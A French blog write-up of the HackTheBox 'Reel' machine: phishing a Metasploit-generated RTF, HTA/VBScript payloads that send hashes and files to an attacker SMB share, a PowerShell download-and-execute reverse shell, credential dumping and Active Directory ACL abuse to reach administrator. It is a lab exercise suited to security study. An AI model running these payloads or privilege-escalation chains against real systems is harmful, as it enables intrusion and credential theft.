# Solution du CTF Reel de HackTheBox

Nitro
-----

En m'inscrivant sur *Hack The Box* mon objectif était de me concentrer sur les machines Windows et ainsi sortir de la zone de confort (CTF sous Linux qui sont majoritaires sur VulnHub).  

Grace aux précédents CTFs de la plateforme j'avais pu me pencher un peu plus sur Powershell ou les macros en VBA... mais il manquait ce petit côté environnement d'entreprise pour rentrer dans le vif du sujet du pentesting Windows.  

Autant dire qu'avec Reel je me suis régalé :)  

Reel 2 Real
-----------

Impossible de ne pas commencer sans le classique scan de ports :  

```plain
Nmap scan report for 10.10.10.77
Host is up (0.034s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_05-29-18  12:19AM       <DIR>          documents
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp open  ssh     OpenSSH 7.6 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:20:c3:bd:16:cb:a2:9c:88:87:1d:6c:15:59:ed:ed (RSA)
|   256 23:2b:b8:0a:8c:1c:f4:4d:8d:7e:5e:64:58:80:33:45 (ECDSA)
|_  256 ac:8b:de:25:1d:b7:d8:38:38:9b:9c:16:bf:f6:3f:ed (ED25519)
25/tcp open  smtp?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, X11Probe: 
|     220 Mail Service ready
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest: 
|     220 Mail Service ready
|     sequence of commands
|     sequence of commands
|   Hello: 
|     220 Mail Service ready
|     EHLO Invalid domain address.
|   Help: 
|     220 Mail Service ready
|     DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
|   SIPOptions: 
|     220 Mail Service ready
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|_    sequence of commands
| smtp-commands: REEL, SIZE 20480000, AUTH LOGIN PLAIN, HELP, 
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
```

L'accès anonyme est autorisé sur le FTP :  

```plain
Connected to 10.10.10.77.
220 Microsoft FTP Service
Name (10.10.10.77:devloop): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
05-29-18  12:19AM       <DIR>          documents
226 Transfer complete.
ftp> cd documents
250 CWD command successful.
ftp> ls -a
200 PORT command successful.
125 Data connection already open; Transfer starting.
05-29-18  12:19AM                 2047 AppLocker.docx
05-28-18  02:01PM                  124 readme.txt
10-31-17  10:13PM                14581 Windows Event Forwarding.docx
226 Transfer complete.
```

Dans le readme on peut lire le texte suivant :  

> please email me any rtf format procedures - I'll review and convert.
> 
> new format / converted documents will be saved here.

Le document sur AppLocker est plutôt concis :  

```plain
AppLocker procedure to be documented - hash rules for exe, msi and scripts (ps1,vbs,cmd,bat,js) are in effect.
```

Mais cela est suffisant pour nous renseigner sur la présence d'*AppLocker* sur la machine (il s'agit d'un système de whitelist des exécutables).  

Pour terminer le dernier docx contient une liste de commandes et d'exemple d'output en rapport avec l'utilitaire *wecutil*. Ça permet d'associer le déclenchement d'actions prédéterminées pour certains événements du système.  

Bien sûr j'ai tout de suite regardé les métadonnées des documents Word et ce dernier document fait référence à l'adresse email *nico@megabank.com*.  

Cela plus la présence du port SMTP et l'incitation à envoyer un RTF étaient suffisant pour avoir notre piste :)  

Move It!
--------

Si on recherche RTF dans Metasploit on trouve entre autres le module *windows/fileformat/office\_word\_hta*. Ce dernier génère un RTF qui provoque le chargement d'un fichier HTA externe. Ce HTA contient des instructions VBA qui seront alors exécutées.  

```plain
msf exploit(windows/fileformat/office_word_hta) > show options

Module options (exploit/windows/fileformat/office_word_hta):

   Name      Current Setting         Required  Description
   ----      ---------------         --------  -----------
   FILENAME  /tmp/new procedure.rtf  yes       The file name.
   SRVHOST   10.10.14.2              yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT   443                     yes       The local port to listen on.
   SSL       false                   no        Negotiate SSL for incoming connections
   SSLCert                           no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH   procedure.hta           yes       The URI to use for the HTA file

Payload options (windows/powershell_reverse_tcp):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   EXITFUNC      process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST         10.10.14.2       yes       The listen address
   LOAD_MODULES                   no        A list of powershell modules seperated by a comma to download over the web
   LPORT         445              yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Microsoft Office Word

msf exploit(windows/fileformat/office_word_hta) > exploit -j
[*] Exploit running as background job 3.
```

On utilise alors *sendemail* pour envoyer le fichier :  

```plain
sudo sendemail -t nico@megabank.com -u "New procedure" -m "Hi Nicolas. Here is a new procedure" -a /tmp/new procedure.rtf -s 10.10.10.77 -f ariel@megabank.com -v
```

Et comme on pouvait s'y attendre ça merdouille avec la présence d'AppLocker :  

```plain
msf exploit(windows/fileformat/office_word_hta) > 
[*] Started reverse SSL handler on 10.10.14.2:445 
[+] /tmp/new procedure.rtf stored at /root/.msf4/local/newprocedure.rtf
[*] Using URL: http://10.10.14.2:443/procedure.hta
[*] Server started.
[-] 10.10.10.77      office_word_hta - Exception handling request: Powershell command length is greater than the command line maximum (8192 characters)
```

Bien sûr les opérations plus basiques fonctionnent... On peut par exemple exfiltrer le hash NetNTLM de l'utilisateur avec le VBA suivant (on garde le même RTF généré par MSF, il nous suffit d'éditer le HTA) :  

```plain
<script language="VBScript">
  window.moveTo -4000, -4000
  Set wzPUNP = CreateObject("Wscript.Shell")
  filename = "\\10.10.14.2\toto\truc.vbs"
  wzPUNP.Run filename,0,True
  window.close()
</script>
```

On peut capturer ce hash avec le module de Metasploit :  

```plain
msf auxiliary(server/capture/smb) > exploit -j
[*] Auxiliary module running as background job 18.

[*] Server started.
msf auxiliary(server/capture/smb) > [*] SMB Captured - 2018-07-07 15:37:43 +0200
NTLMv2 Response Captured from 10.10.10.77:58721 - 10.10.10.77
USER:nico DOMAIN:HTB OS: LM:
LMHASH:Disabled 
LM_CLIENT_CHALLENGE:Disabled
NTHASH:f4404e1f875ed4cc12e5308f8a0383db 
NT_CLIENT_CHALLENGE:01010000000000002e367305d312d40135120fd8899414f400000000020000000000000000000000
```

Ou encore à l'aide de Responder :  

```plain
Responder
[+] Listening for events...
[SMBv2] NTLMv2-SSP Client   : 10.10.10.77
[SMBv2] NTLMv2-SSP Username : HTB\nico
[SMBv2] NTLMv2-SSP Hash     : nico::HTB:a8fcb58a95e93ee4:EC508DB8BA3DCA23F09E7E1FC5CAB0F9:0101000000000000C0653150DE09D201DFD2FBC44BDE3940000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000100000000200000803EBD2E178E601C3B188621BBDBDAFB4AF51DA31565A1D3D4BD4420D4B777C40A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E003200000000000000000000000000
```

Malheureusement on ne vas pas bien loin avec ça... le mot de passe est suffisamment costaud :'(   

En utilisant SMB on peut par exemple accéder au premier flag en le copiant simplement chez nous:  

```plain
<script language="VBScript">
  window.moveTo -4000, -4000
  Set objFSO = CreateObject("Scripting.FileSystemObject")
  Set lolilol = CreateObject("Wscript.Shell")
  strHomeFolder = lolilol.ExpandEnvironmentStrings("%USERPROFILE%")
  usertxt = strHomeFolder & "\Desktop\user.txt"
  objFSO.CopyFile usertxt, "\\10.10.14.2\public\", True
</script>
```

Pour mettre en place un partage SMB sans trop de prise de tête, *Impacket* est fort utile :  

```plain
devloop@kali:/tmp$ sudo impacket-smbserver public jail/
Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.77,65441)
[*] AUTHENTICATE_MESSAGE (HTB\nico,REEL)
[*] User nico\REEL authenticated successfully
[*] nico::HTB:4141414141414141:10cc7a92c4dba43ebdc87a6c8b60998b:01010000000000008030ca54e312d401c71438f612cc71a600000000010010004700550071004e004500520057006a0002001000430072006700490044005a004e004800030010004700550071004e004500520057006a0004001000430072006700490044005a004e004800070008008030ca54e312d4010600040002000000080030003000000000000000010000000020000022716c0753bce62fc936e8ca13413cb0c1ab786291d77b014707b79d86f979620a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e003200000000000000000000000000
[*] Disconnecting Share(1:PUBLIC)
[*] Handle: [Errno 104] Connection reset by peer
[*] Closing down connection (10.10.10.77,65441)
[*] Remaining connections []
```

Premier flag : fa363aebcfa2c29897a69af385fee971  

Via cette astuce et en utilisant la redirection d'output j'ai pu lister le dossier utilisateur, obtenir des infos sur le système (Microsoft Windows Server 2012 R2 Standard à jour) mais çà ne nous donne pas un shell.  

AppUnLocker
-----------

On trouve sur le web différentes techniques pour contourner AppLocker. Elles sont rassemblées [sur ce Github](https://github.com/api0cradle/UltimateAppLockerByPassList).  

Pour plus de détails plusieurs de ces exemples sont décrits [sur le blog pentestlab](https://pentestlab.blog/2017/06/12/applocker-bypass-file-extensions/).  

J'ai tenté sans succès [la technique installutil.exe](https://pentestlab.blog/2017/05/08/applocker-bypass-installutil/) :  

```plain
<script language="VBScript">
  window.moveTo -4000, -4000
  Set objFSO = CreateObject("Scripting.FileSystemObject")
  Set objSuperFolder = objFSO.GetFolder("C:\Windows\Microsoft.NET\Framework\")
  Call ShowSubfolders (objSuperFolder)

  WScript.Quit 0

  Sub ShowSubFolders(fFolder)
    Set objFolder = objFSO.GetFolder(fFolder.Path)
    Set colFiles = objFolder.Files
    For Each objFile in colFiles
      If UCase(objFile.name) = "INSTALLUTIL.EXE" Then
        Set lolilol = CreateObject("Wscript.Shell")
        utilPath = fFolder.Path & "\" & objFile.Name & " " & "/logfile= /LogToConsole=false /U \\10.10.14.2\public\exeshell.exe"
        lolilol.Run utilPath, 0, True
      End If
    Next

    For Each Subfolder in fFolder.SubFolders
      ShowSubFolders(Subfolder)
    Next
  End Sub
</script>
```

Il est plus simple d'obtenir [un reverse shell basique](https://gist.github.com/staaldraad/204928a6004e89553a8d3db0ce527fd5) en appelant un script Powershell sans l'extension ps1 :  

```plain
<script language="VBScript">
  window.moveTo -4000, -4000
  Set objFSO = CreateObject("Scripting.FileSystemObject")
  Set lolilol = CreateObject("Wscript.Shell")
  strHomeFolder = lolilol.ExpandEnvironmentStrings("%USERPROFILE%")
  filename = strHomeFolder & "\NTUSER.DAT"
  lolilol.Run "powershell.exe  -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://10.10.15.187/minireverse')",0
</script>
```

J'ai finalement pu obtenir via session *Meterpreter* avec *web\_delivery* puis trouver mon bonheur parmi les modules d'énumération locale:  

```plain
msf exploit(multi/script/web_delivery) > show options

Module options (exploit/multi/script/web_delivery):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  10.10.15.187     yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT  8080             yes       The local port to listen on.
   SSL      false            no        Negotiate SSL for incoming connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                   no        The URI to use for this exploit (default is random)

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.15.187     yes       The listen address
   LPORT     4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   2   PSH

msf exploit(multi/script/web_delivery) > exploit -j
[*] Exploit running as background job 2.

[*] Started reverse TCP handler on 10.10.15.187:4444 
msf exploit(multi/script/web_delivery) > [*] Using URL: http://10.10.15.187:8080/k9mHBlFwzU
[*] Server started.
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -c $O=new-object net.webclient;$O.proxy=[Net.WebRequest]::GetSystemWebProxy();$O.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $O.downloadstring('http://10.10.15.187:8080/k9mHBlFwzU');
[*] 10.10.10.77      web_delivery - Delivering Payload
[*] Sending stage (179779 bytes) to 10.10.10.77
[*] Meterpreter session 1 opened (10.10.15.187:4444 -> 10.10.10.77:60751) at 2018-07-08 15:29:59 +0200

msf exploit(multi/script/web_delivery) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > sysinfo
Computer        : REEL
OS              : Windows 2012 R2 (Build 9600).
Architecture    : x64
System Language : en_GB
Domain          : HTB
Logged On Users : 13
Meterpreter     : x86/windows

msf post(multi/recon/local_exploit_suggester) > exploit

[*] 10.10.10.77 - Collecting local exploits for x64/windows...
[*] 10.10.10.77 - 15 exploit checks are being tried...
[*] Post module execution completed

msf post(windows/gather/credentials/windows_autologin) > exploit

[*] Running against REEL on session 2
[+] AutoAdminLogon=1, DefaultDomain=HTB, DefaultUser=nico, DefaultPassword=4dri@na2017!**
[*] Post module execution completed
```

Are You Ready for Some More?
----------------------------

Ce mot de passe d'autologin est suffisant pour nous permettre de nous connecter via SSH. Oui se connecter avec SSH à Windows est une expérience assez perturbante :p   

On trouve dans le dossier de notre utilisateur nico un fichier *cred.xml* que voici :  

```html
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">HTB\Tom</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692</SS>
    </Props>
  </Obj>
</Objs>
```

Il s'agit en quelque sorte d'un format de sérialisation pour un identifiant utilisable dans Powershell. Tenter de copier le fichier pour l'utiliser localement semble assez compliqué, d'abord parce qu'il est lié à d'autres clés RSA présentes sur la machine et visiblement un simple copier / coller ne suffit pas... J'ai pas cherché à aller plus loin.  

```plain
devloop@kali:~/Documents$ ssh nico@10.10.10.77
The authenticity of host '10.10.10.77 (10.10.10.77)' can't be established.
ECDSA key fingerprint is SHA256:jffiqnVqz/MrcDasdsjISFIcN/xtlDj1C76Yu1mDQVY.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.10.77' (ECDSA) to the list of known hosts.
nico@10.10.10.77's password: 

Microsoft Windows [Version 6.3.9600]                                                                                            
(c) 2013 Microsoft Corporation. All rights reserved.                                                                            

nico@REEL C:\Users\nico>powershell                                                                                              
Windows PowerShell                                                                                                              
Copyright (C) 2014 Microsoft Corporation. All rights reserved.                                                                  

PS C:\Users\nico> $mycreds = Import-Clixml "Desktop\cred.xml"                                                                   
PS C:\Users\nico> $mycreds                                                                                                      

UserName                                                                                                               Password 
--------                                                                                                               -------- 
HTB\Tom                                                                                            System.Security.SecureString 

PS C:\Users\nico> $mycreds.GetNetworkCredential().password                                                                      
1ts-mag1c!!!
```

On peut ainsi passer de Nico à Tom. Qu'est-ce qu'on y gagne ?  

Nico avait les groupes suivants :  

```plain
Local Group Memberships      *Performance Monitor U*Print Operators      
Global Group memberships     *AppLocker_Test       *Domain Users         
                             *MegaBank_Users       *DR_Site              
                             *HelpDesk_Admins      *Restrictions
```

Et pour ce qui est de Tom :  

```plain
Local Group Memberships      *Print Operators      
Global Group memberships     *Domain Users         *SharePoint_Admins    
                             *MegaBank_Users       *DR_Site              
                             *HelpDesk_Admins      *Restrictions
```

On semble sortir de cette restriction AppLocker ce qui n'est pas un mal :)   

Go On Move
----------

Le plus intéressant une fois connecté avec Tom c'est la présence d'une note laissé dans un dossier *AD Audit* :  

```plain
tom@REEL C:\Users\tom\Desktop\AD Audit>type note.txt                                                                            
Findings:                                                                                                                       

Surprisingly no AD attack paths from user to Domain Admin (using default shortest path query).                                  

Maybe we should re-run Cypher query against other groups we've created.
```

Et dans ce dossier se trouve une copie de *BloodHound* qui n'attend plus que nous.  

[BloodHound](https://github.com/BloodHoundAD/BloodHound) est un outil qui permet de faire des graphes de relation entre les différents objets d'un *ActiveDirectory* (utilisateurs, groupes, machines, etc) et ainsi mettre en évidence la présence de problèmes de permission permettant de remonter jusqu'à des privilèges d'administrateur du domaine. Une vidéo explicative [peut se voir sur YouTube](https://www.youtube.com/watch?v=lxd2rerVsLo).  

Bloodhound a donc une partie graphique. L'autre partie permet de générer les CSV à partir desquels les graphes seront générés :  

```plain
tom@REEL C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors>powershell -nop -exec bypass                                        
Windows PowerShell                                                                                                              
Copyright (C) 2014 Microsoft Corporation. All rights reserved.                                                                  

PS C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors> Import-Module .\SharpHound.ps1                                           
PS C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors> Invoke-Bloodhound                                                        
Initializing BloodHound at 9:13 AM on 7/8/2018                                                                                  
Starting Default enumeration for HTB.LOCAL                                                                                      
Status: 29 objects enumerated (+29 Infinity/s --- Using 70 MB RAM )                                                             
Finished enumeration for HTB.LOCAL in 00:00:00.4181362                                                                          
0 hosts failed ping. 0 hosts timedout.
```

On peut appeler plus finement le module ou le lancer de façon plus exhaustive. Dans tous les cas cela génère des fichiers CSV dans le répertoire courant qu'on s'empresse de rapatrier pour charger dans *BloodHound* que l'on aura préalablement [installé et configuré](https://www.youtube.com/watch?v=wIOGwaE7DCk).  

*BloodHound* a une fonctionnalité de recherche de chemin qui ici ne retourne rien pour passer de Tom au groupe *Domain Admins*. Mais si on s'intéresse aux droits que l'on a actuellement ça devient intéressant :  

![HackTheBox Reel Tom writeOwner Claire LDAP Bloodhound](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/reel_tom_owns_claire.png)

On dispose ici du droit *writeOwner* qui permet de définir qui est le propriétaire de l'utilisateur Claire.  

C'est aussi possible de retrouver cette relation directement avec PowerView :  

```plain
PS C:\Users\tom\Desktop\AD Audit\BloodHound> Get-DomainObjectACL -Identity Claire -ResolveGUIDS | ? {$_.SecurityIdentifier -match $(ConvertTo-SID tom)}                                                                                                         
AceType               : AccessAllowed                                                                                           
ObjectDN              : CN=Claire Danes,CN=Users,DC=HTB,DC=LOCAL                                                                
ActiveDirectoryRights : WriteOwner                                                                                              
OpaqueLength          : 0                                                                                                       
ObjectSID             : S-1-5-21-2648318136-3688571242-2924127574-1130                                                          
InheritanceFlags      : None                                                                                                    
BinaryLength          : 36                                                                                                      
IsInherited           : False                                                                                                   
IsCallback            : False                                                                                                   
PropagationFlags      : None                                                                                                    
SecurityIdentifier    : S-1-5-21-2648318136-3688571242-2924127574-1107                                                          
AccessMask            : 524288                                                                                                  
AuditFlags            : None                                                                                                    
AceFlags              : None                                                                                                    
AceQualifier          : AccessAllowed
```

Pour exploiter cela on a recours à la commande *Set-DomainObjectOwner* de PowerView. C'est documenté sur [le blog de wald0](https://wald0.com/?p=112) (l'un des auteurs).  

PowerSploit dispose de [la documentation de référence](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainObjectOwner/) pour la commande.  

```plain
PS C:\Users\tom\Desktop\AD Audit\BloodHound> Import-Module .\PowerView.ps1 
PS C:\Users\tom\Desktop\AD Audit\BloodHound> Set-DomainObjectOwner -Identity claire -OwnerIdentity tom                          
PS C:\Users\tom\Desktop\AD Audit\BloodHound> Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights All
PS C:\Users\tom\Desktop\AD Audit\BloodHound> net user claire !l33tpassw0rd /domain                                              
The command completed successfully.

User name                    claire                                                                                             
Full Name                    Claire Danes                                                                                       
Comment                                                                                                                         
User's comment                                                                                                                  
Country/region code          000 (System Default)                                                                               
Account active               Yes                                                                                                
Account expires              Never                                                                                              

Password last set            7/5/2018 1:49:07 PM                                                                                
Password expires             Never
Password changeable          7/6/2018 1:49:07 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   7/5/2018 1:49:40 PM

Logon hours allowed          All

Local Group Memberships      *Hyper-V Administrator
Global Group memberships     *Domain Users         *MegaBank_Users
                             *DR_Site              *Restrictions
```

On s'accorde ici tous les droits sur Claire. A noter que récupérer uniquement la permission *ResetPassword* ne semble pas suffire pour changer le mot de passe.  

Raise Your Hands
----------------

En récupérant l'accès à Claire je m'attendais à ce que l'on puisse ensuite sauter vers le compte *claire\_da* qui est domain admin... Mais en fait non  

Claire dispose de la permission writeDACL sur le groupe backup admins :  

![HackTheBox Reel BloodHound Claire writeDACL on Backup Admins group LDAP](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/reel_claire_writedacl_backup.png)

et ce groupe dispose pour ainsi dire de rien du tout (il n'y a que des relations entrantes).  

![HackTheBox Reel BloodHound backup admins relation graph LDAP](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/reel_backup_admins.png)

Si on se rencarde un peu [sur ce type de groupe](https://ss64.com/nt/syntax-security_groups.html) on voit que les membres ont généralement un accès non-limité au système de fichier :  

> A built-in group. By default, the group has no members.
> Backup Operators can back up and restore all files on a computer, regardless of the permissions that protect those files.
> Backup Operators also can log on to the computer and shut it down.

On peut alors s'octroyer les privilèges d'ajout de membre et nous ajouter au groupe :  

```plain
PS C:\temp> Add-DomainObjectAcl -TargetIdentity Backup_Admins -PrincipalIdentity claire -Rights WriteMembers
PS C:\temp> net group Backup_Admins claire /add
The command completed successfully.
```

Mais déception : bien que l'on dispose des droits sur le dossier personnel de l'administrateur :  

```plain
claire@REEL C:\Users>icacls Administrator
Administrator NT AUTHORITY\SYSTEM:(OI)(CI)(F)
              HTB\Backup_Admins:(OI)(CI)(F)
              HTB\Administrator:(OI)(CI)(F)
              BUILTIN\Administrators:(OI)(CI)(F)
```

L'accès au *root.txt* (le flag final) nous est refusé :(  

Plusieurs scripts Powershell sont présents dans un sous-dossier *Backup Scripts* ainsi qu'une archive *BackupScript.zip*.  

J'ai eu la bonne idée de faire un diff sur les fichiers ps1 présents et ceux du zip :  

```plain
devloop@kali:~/Documents/reel/Backup Scripts$ diff BackupScript.ps1 yolo/BackupScript.ps1
1,2c1,41
< # admin password
< $password="Cr4ckMeIfYouC4n!"
--- snip ---
```

Et enfin on peut passer administrateur et accéder au flag :  

```plain
administrator@REEL C:\Users\Administrator\Desktop>type root.txt
1018a0331e686176ff4577c728eaf32a
```

Conclusion
----------

Un CTF super prenant qui m'a fait découvrir beaucoup de choses. Au top !

*Published November 10 2018 at 17:03*